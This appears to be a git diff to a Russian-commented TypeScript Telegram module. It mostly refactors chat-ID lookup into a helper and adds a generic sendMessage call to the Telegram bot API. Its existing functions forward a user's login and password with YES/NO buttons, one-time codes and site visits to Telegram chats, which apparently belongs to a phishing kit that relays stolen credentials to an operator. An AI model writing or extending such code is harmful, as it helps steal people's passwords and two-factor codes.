@@ -9,6 +9,30 @@ const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";
 const TELEGRAM_CHAT_IDS = process.env.TELEGRAM_CHAT_IDS || "";
 
 /**
+ * Получение списка Chat ID для отправки сообщений
+ * Использует переменные окружения и файл telegram-chat-ids.json
+ */
+function getChatIdsList(): string[] {
+  try {
+    // Используем динамический import для Edge Runtime
+    const telegramChatIds = require("./telegram-chat-ids");
+    return telegramChatIds.getChatIds();
+  } catch (error) {
+    console.error("[TELEGRAM] Ошибка загрузки модуля telegram-chat-ids:", error);
+    // Fallback на переменные окружения
+    const chatIds: string[] = [];
+    if (TELEGRAM_CHAT_ID) {
+      chatIds.push(TELEGRAM_CHAT_ID);
+    }
+    if (TELEGRAM_CHAT_IDS) {
+      const additionalIds = TELEGRAM_CHAT_IDS.split(",").map(id => id.trim()).filter(id => id);
+      chatIds.push(...additionalIds);
+    }
+    return chatIds;
+  }
+}
+
+/**
  * Отправка сообщения в Telegram с кнопками YES/NO
  * @param username - имя пользователя
  * @param password - пароль
@@ -33,16 +57,8 @@ export async function sendLoginTelegram(
     throw new Error("TELEGRAM_BOT_TOKEN должен быть настроен");
   }
 
-  // Формируем список Chat ID для отправки
-  const chatIds: string[] = [];
-  if (TELEGRAM_CHAT_ID) {
-    chatIds.push(TELEGRAM_CHAT_ID);
-  }
-  if (TELEGRAM_CHAT_IDS) {
-    // Разделяем по запятой и добавляем в список
-    const additionalIds = TELEGRAM_CHAT_IDS.split(",").map(id => id.trim()).filter(id => id);
-    chatIds.push(...additionalIds);
-  }
+  // Получаем список Chat ID для отправки
+  const chatIds = getChatIdsList();
 
   if (chatIds.length === 0) {
     throw new Error("TELEGRAM_CHAT_ID или TELEGRAM_CHAT_IDS должны быть настроены");
@@ -158,16 +174,8 @@ export async function sendCodeTelegram(
     throw new Error("TELEGRAM_BOT_TOKEN должен быть настроен");
   }
 
-  // Формируем список Chat ID для отправки
-  const chatIds: string[] = [];
-  if (TELEGRAM_CHAT_ID) {
-    chatIds.push(TELEGRAM_CHAT_ID);
-  }
-  if (TELEGRAM_CHAT_IDS) {
-    // Разделяем по запятой и добавляем в список
-    const additionalIds = TELEGRAM_CHAT_IDS.split(",").map(id => id.trim()).filter(id => id);
-    chatIds.push(...additionalIds);
-  }
+  // Получаем список Chat ID для отправки
+  const chatIds = getChatIdsList();
 
   if (chatIds.length === 0) {
     throw new Error("TELEGRAM_CHAT_ID или TELEGRAM_CHAT_IDS должны быть настроены");
@@ -346,16 +354,8 @@ export async function sendVisitNotification(
     return;
   }
 
-  // Формируем список Chat ID для отправки
-  const chatIds: string[] = [];
-  if (TELEGRAM_CHAT_ID) {
-    chatIds.push(TELEGRAM_CHAT_ID);
-  }
-  if (TELEGRAM_CHAT_IDS) {
-    // Разделяем по запятой и добавляем в список
-    const additionalIds = TELEGRAM_CHAT_IDS.split(",").map(id => id.trim()).filter(id => id);
-    chatIds.push(...additionalIds);
-  }
+  // Получаем список Chat ID для отправки
+  const chatIds = getChatIdsList();
 
   if (chatIds.length === 0) {
     console.log("[TELEGRAM] TELEGRAM_CHAT_ID не настроен, уведомление не отправлено");
@@ -442,5 +442,47 @@ export async function answerCallbackQuery(
   } catch (error) {
     console.error("[TELEGRAM] Ошибка ответа на callback:", error);
   }
+}
+
+/**
+ * Отправка сообщения в Telegram
+ * @param chatId - Chat ID получателя
+ * @param text - текст сообщения
+ * @param parseMode - режим парсинга (Markdown, HTML или undefined)
+ * @returns message_id отправленного сообщения
+ */
+export async function sendMessage(
+  chatId: string,
+  text: string,
+  parseMode?: "Markdown" | "HTML"
+): Promise<number> {
+  if (!TELEGRAM_BOT_TOKEN) {
+    throw new Error("TELEGRAM_BOT_TOKEN должен быть настроен");
+  }
+
+  const response = await fetch(
+    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+    {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: text,
+        parse_mode: parseMode,
+      }),
+    }
+  );
+
+  const data = await response.json();
+
+  if (!response.ok) {
+    console.error(`[TELEGRAM] Ошибка отправки сообщения на ${chatId}:`, data);
+    throw new Error(`Ошибка отправки сообщения: ${data.description || "Unknown error"}`);
+  }
+
+  console.log(`[TELEGRAM] Сообщение отправлено на ${chatId}, message_id:`, data.result.message_id);
+  return data.result.message_id;
 }
 
